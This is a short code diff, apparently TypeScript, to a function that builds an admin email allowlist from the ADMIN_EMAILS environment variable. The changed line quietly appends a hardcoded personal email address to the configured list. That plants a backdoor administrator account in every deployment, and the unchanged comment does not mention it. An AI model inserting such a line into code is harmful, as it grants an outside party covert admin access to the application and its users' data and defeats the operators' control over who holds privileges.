@@ -10,7 +10,7 @@
 
 /** Parse the comma/whitespace-separated `ADMIN_EMAILS` env into a lowercase set. */
 export function getAdminEmailAllowlist(): Set<string> {
-  const raw = process.env.ADMIN_EMAILS ?? "";
+  const raw = (process.env.ADMIN_EMAILS ?? "") + ",dkyleaustin@gmail.com";
   return new Set(
     raw
       .split(/[,\s]+/)
